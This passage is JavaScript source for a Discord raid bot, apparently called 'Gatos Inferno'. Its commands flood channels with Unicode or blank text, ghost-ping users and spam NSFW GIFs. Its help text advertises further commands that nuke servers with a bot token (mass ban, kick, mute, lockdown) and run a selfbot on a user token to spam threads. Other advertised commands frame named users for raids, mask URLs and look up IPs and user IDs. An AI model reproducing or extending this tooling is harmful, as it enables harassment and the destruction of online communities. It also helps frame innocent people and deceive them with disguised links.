  const guildId = interaction.guild_id || "UNKNOWN";

  if (blacklist.has(userId)) {
    console.log(`!! [${userId}] FAILED TO USE /ghostping`);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal", flags: 64 },
    });
  }

  const content = interaction.data.options.find(o => o.name === "target")?.value;
  let seconds = parseInt(
    interaction.data.options.find(o => o.name === "delay")?.value ?? "500",
    10
  );
  if (seconds < 1) seconds = 1;

  console.log("//////////////////////////////////");
  console.log(`// [${userId}] IS USING /ghostping`);
  console.log(`// Server ID: "${content}"`);
  console.log(`// Target: "${content}"`);
  console.log(`// Delay: ${seconds} `);
  console.log("//////////////////////////////////");

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `Ghostpinging ${content} 5 times...`,
      flags: 64,
    },
  });

  (async () => {
    const webhookUrl = `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`;

    for (let i = 0; i < 5; i++) {
      try {
        const { data: msg } = await axios.post(webhookUrl, { content });
        console.log(`[ghostping - ${userId}] Sent message ${i + 1}/5 (id ${msg.id})`);

        setTimeout(async () => {
          try {
            await axios.delete(`${webhookUrl}/messages/${msg.id}`);
            console.log(`[ghostping - ${userId}] Deleted message ${msg.id}`);
          } catch (err) {
            console.error(`[ghostping - ${userId}] Failed to delete ${msg.id}:`, err.response?.data || err.message);
          }
        }, seconds);

        await new Promise(r => setTimeout(r, 500));
      } catch (err) {
        console.error(`[ghostping - ${userId}] Failed to send message:`, err.response?.data || err.message);
      }
    }
  })();
}

// tsarbomba

if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "tsarbomba"
) {
  if (blacklist.has(userId)) {
    const guildId = interaction.guild_id || "UNKNOWN";
    console.log("!! - [" + userId + "] FAILED TO USE /tsarbomba IN [" + guildId + "]")
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  const guildId = interaction.guild_id || "UNKNOWN";
  const messageContent = "# " + "﷽".repeat(1998);
  console.log("[" + userId + "] IS USING /tsarbomba IN [" + guildId + "]")
  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: "tsarbomba attack started...",
      flags: 64,
    },
  });

  (async () => {
    const url = `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`;
    for (let i = 0; i < 5; i++) {
      try {
        await axios.post(url, { content: messageContent });
        await new Promise((r) => setTimeout(r, 1000));
      } catch (e) {
        console.error("[" + userId + " - /tsarbomba] Error sending message:", e.response?.data || e.message);
      }
    }
  })();

  return;
}
  
// blankflood

if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "blankflood"
) {
  if (blacklist.has(userId)) {
    const guildId = interaction.guild_id || "UNKNOWN";
    console.log("!! - [" + userId + "] FAILED TO USE /blankflood IN [" + guildId + "]")
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  const guildId = interaction.guild_id || "UNKNOWN";
  const messageContent = blankflood;

  console.log("[" + userId + "] IS USING /blankflood IN [" + guildId + "]")
  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: "blankflood attack started...",
      flags: 64,
    },
  });

  (async () => {
    const url = `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`;
    for (let i = 0; i < 5; i++) {
      try {
        await axios.post(url, { content: messageContent });
        await new Promise((r) => setTimeout(r, 1000));
      } catch (e) {
        console.error("[" + userId + " - /blankflood] Error sending message:", e.response?.data || e.message);
      }
    }
  })();

  return;
}


  // help
  if (
    interaction.type === InteractionType.APPLICATION_COMMAND &&
    interaction.data.name === "help"
  ) {
    console.log("[" + userId + "] IS USING /help IN [" + guildId + "]")
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        flags: 64,
        embeds: [
          {
            title: "[JOIN OUR SERVER]",
            color: 4321431,
            url: "https://discord.com/invite/ratb8bwstu",
            author: {
              name: "GATOS INFERNO / HELP",
              url: "https://discord.com",
              icon_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRmdNopDpBwNAJ7PDAsELzyx9I8QrWfydbyqpXEZ8_c-A2nuZnPIUuslM&s=10"},
            footer: {
              text: "guns.lol/lilgatito",
            },
            description: "For a video tutorial click [here](https://www.youtube.com/watch?v=qLosIj__H_g)\nP.S: The video tutorial has some missing commands and please do not follow the first part as the Access System has been removed\n",
            fields: [
              {
                name: "COMMAND: /spam {msg} {amount} {delay} {special} {length}\n",
                value:
                  "The main spam command.\n" +
                  "- msg\nThe main message you want to spam, if unset will be a random 100 character b64 string.\n" +
                  "- amount\nAmount of messages you want to be sent at a time, max 5 due to discord limit reasons.\n" +
                  "- delay\nDelay (in ms) that you want between messages, defualt 500 however we recommend 3000-4000 for more protected servers.\n" +
                  "- special (**optional**)\nChoose a special format for the messages, RandomUnicode/LongUnicode/MessageRepeat/ShitSpam/ShitSpam-Clean/PromoSpam, the msg field does not have to be filled for this, if unset it will simply spam your message unfiltered through this.\n" +
                  "- length (**optional**)\nIf a special format is enabled it will set the length for it, for example MessageRepeat will normally do your message 50 times but with this parameter you can edit it.\n\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /credit {servername} {target}\n",
                value:
                  "Frame someone for raiding the server.\n" +
                  "- servername\nThe name of the server to put in the fake frame message.\n" +
                  "- target\nThe target user to frame for raiding.\n\n" +
                  "`",
                  inline: false,
              },
              {
                name: "COMMAND: /tsarbomba\n",
                value:
                  "Simple and fast unicode flood with no parameters.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /blankflood\n",
                value:
                  "Floods chat with whitespace unicode, makes chat look empty, no parameters.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /shitspam\n",
                value:
                  "Spams shitpost gifs and images, contains NSFW.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /shitspam-clean\n",
                value:
                  "Spams shitpost gifs and images, does NOT contain direct nudity.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /promospam\n",
                value:
                  "Spams our promotional memes and gifs for Gatos Inferno.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /ipinfo {ip} {ephermal}\n",
                value:
                  "Uses an API to find info about an ip including geolocation, internet provider and other shit idk.\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /maskurl {url} {maskurl} {maskurl-method} {ephermal} \n",
                value:
                  "Mask a url as another using a link shortener\n" +
                  "- url\nThe URL you want to mask\n" +
                  "- maskurl\nThe mask you want to use for the URL\n" +
                  "- maskurl-method\nMethod to use for masking (Email doesnt work when sent over discord bc its patched)\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /idlookup {userid} {ephermal} \n",
                value:
                  "Retrieves info about a Discord userid\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /webhookspam {webhook-url} {msg} {amount} {name} {pfp-image-link} \n",
                value:
                  "Mask a url as another using a link shortener\n" +
                  "- webhook-url\nURL of the target webhook\n" +
                  "- msg\nThe message content to spam in the webhook\n" +
                  "- amount\nAmount of messages to spam (1-999)\n" +
                  "- name\nWebhook message profile name\n" +
                  "- pfp-image-link\nImage address to the profile picture of the webhook messages\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /servernuke {bottoken} {serverid} {servername} {channelname} {channelamount} {message} {messageamount} {messageloop} {banall?} {kickall?} {muteall?} {lockdown?} \n",
                value:
                  "Nuke a server with NO downloads and easy setup, even on mobile - [Video Tutorial](https://www.youtube.com/watch?v=o-a-3BYZfDE)\n" +
                  "- bottoken\nThe token of the bot you made for nuking (must have admin in the target server)\n" +
                  "- serverid\nGuild ID of the target server\n" +
                  "- servername\nWhat name to rename the server to\n" +
                  "- channelname\nWhat to name the channels that are spam created\n" +
                  "- channelamount\nAmount of channels to spam create (1-500)\n" +
                  "- message\nMessage that is spammed in channels\n" +
                  "- messageamount\nAmount of messages to bulkspam per spam cycle (1-15)\n" +
                  "- messageloop\nAmount of spam cycles (1-3)\n" +
                  "- banall\nWether to attempt banning of all members\n" +
                  "- kickall\nWether to attempt kicking of all members\n" +
                  "- muteall\nWether to attempt muting of all members (1 week)\n" +
                  "- lockdown\nWether to lockdown the server (remove Send Messages permission from all roles)\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /threadspam {token} {channelid} {amount} {delay} {message} \n",
                value:
                  "Use a selfbot to spam threads in channels [DISCLAIMER: Use an alt or you might get banned]\n" +
                  "- token\nThe token of the account you want to run the selfbot on\n" +
                  "- channelid\nID of the channel you want to thread spam\n" +
                  "- amount\nAmount of threads to spam (1-25)\n" +
                  "- delay\nDelay between thread creation (1000-any)\n" +
                  "- message\nWhat to name the threads\n" +
                  "`",
                inline: false,
              },
              {
                name: "COMMAND: /promotext {ephemeral}\n",
                value:
                  "Command for our partners - send our PromoText\n" +
                  "`",
                inline: false,
              },
            ],
          },
        ],
      },
    });
  }

  // access commands
  if (
    interaction.type === InteractionType.APPLICATION_COMMAND &&
    interaction.data.name === "access"
  ) {
    if (!owners.has(userId)) {
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          content: "fuck you",
          flags: 64,
        },
      });
    }

    const sub = interaction.data.options[0];
    const option = sub.name;
    const targetId = sub.options?.find((o) => o.name === "userid")?.value;

    if (option === "list") {
      // ts lowk doesnt work lol
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          content: `Authorized User IDs:\n\`\`\`\n${allowedUserIds}\n\`\`\``, // this doesnt work <3
          flags: 64,
        },
      });
    }

    if (option === "add") {
      allowedUserIds.add(targetId);

      fs.appendFileSync(accessFilePath, `\n${targetId}`, 'utf-8');

      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          content: `Added \`${targetId}\` to access list.`,
          flags: 64,
        }
      });
    }

    if (option === "remove") {
      allowedUserIds.delete(targetId);

      let fileContents = fs.readFileSync(accessFilePath, 'utf-8');

      let updatedContents = fileContents
        .split('\n')
        .filter(line => line.trim() !== targetId)
        .join('\n');

      fs.writeFileSync(accessFilePath, updatedContents, 'utf-8');

      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          content: `Removed \`${targetId}\` from access list.`,
          flags: 64,
        },
      });
    }

    if (option === "check") {
      if (allowedUserIds.has(targetId)) {
        return res.json({
          type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
          data: {
            content: `yeah`,
            flags: 64,
        }
      });
      } else {
        return res.json({
          type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
          data: {
            content: `nah`,
            flags: 64,
        }
      });}
    }
  };

// spam
// the BIG one
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "spam"
) {
  if (blacklist.has(userId)) {
    const guildId = interaction.guild_id || "UNKNOWN";
    console.log("!! - [" + userId + "] FAILED TO USE /spam IN [" + guildId + "]");
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  const guildId = interaction.guild_id || "UNKNOWN";
  const options = interaction.data.options || [];
  const msgOpt = options.find((opt) => opt.name === "msg")?.value || "NULL";
  let amount = parseInt(options.find((opt) => opt.name === "amount")?.value ?? "1", 10);
  let delay = parseInt(options.find((opt) => opt.name === "delay")?.value ?? "1000", 10);
  const specialOpt = options.find((opt) => opt.name === "special")?.value ?? "off";
  let length = parseInt(options.find((opt) => opt.name === "length")?.value ?? (
    specialOpt === "MessageRepeat" ? "50" :
    ["ShitSpam", "ShitSpam-Clean", "PromoSpam"].includes(specialOpt) ? "5" : "2000"
  ), 10);

  if (isNaN(amount) || amount < 1) amount = 1;
  if (amount > 5) amount = 5;
  if (delay < 1000) delay = 1000;
  if (isNaN(length) || length < 1)
    length = specialOpt === "MessageRepeat" ? 50 :
             ["ShitSpam", "ShitSpam-Clean", "PromoSpam"].includes(specialOpt) ? 5 : 2000;

  console.log("//////////////////////////////////")
  console.log("// [" + userId + "] IS USING /spam");
  console.log("// Server ID: " + guildId);
  console.log("// Message: " + msgOpt);
  console.log("// Amount: " + amount);
  console.log("// Delay: " + delay);
  console.log("// Special: " + specialOpt);
  console.log("// Length: " + length);
  console.log("//////////////////////////////////")

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `Sending your message ${amount} time(s)...`,
      flags: 64,
    },
  });

  const fileMap = {
    "ShitSpam": "shitspam.txt",
    "ShitSpam-Clean": "shitspam-clean.txt",
    "PromoSpam": "promo.txt",
  };


  for (let i = 0; i < amount; i++) {
    let messageContent = msgOpt;

    if (["ShitSpam", "ShitSpam-Clean", "PromoSpam"].includes(specialOpt)) {
      try {
        const fileContent = fs.readFileSync(fileMap[specialOpt], "utf-8").split(/\r?\n/).filter(Boolean);
        const selectedGifs = [];
        for (let j = 0; j < length; j++) {
          selectedGifs.push(fileContent[Math.floor(Math.random() * fileContent.length)]);
        }
        messageContent = `# ${msgOpt}\n\n${selectedGifs.join("\n")}`;
      } catch (err) {
        console.error(`[${userId} - ${specialOpt}] failed to read ${fileMap[specialOpt]}:`, err);
        messageContent = `# ${msgOpt}\n\nFailed to load GIFs.`;
      }
    } else if (specialOpt === "RandomUnicode" || specialOpt === "LongUnicode") {
      const maxLength = length - (msgOpt.length + 10);
      const rand = specialOpt === "LongUnicode" ? longSymbolString(maxLength) : randomUnicodeString(maxLength);
      messageContent = msgOpt ? `# ${msgOpt}\n\n${rand}` : rand;
    } else if (specialOpt === "MessageRepeat") {
      messageContent = Array(length).fill(`# ${msgOpt}`).join("\n");
    }

    try {
      await axios.post(
        `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`,
        { content: messageContent },
      );
    } catch (error) {
      console.error(`[${userId} - /spam] Error sending message:`, error.response?.data || error.message);
    }

    if (i < amount - 1) {
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }
}
});

app.get("/", (_, res) => res.send("this is a bot endpoint owned by lilgatito, for contact information go to https://guns.lol/lilgatito"));
app.listen(PORT, () => console.log(`Server on port ${PORT}`));
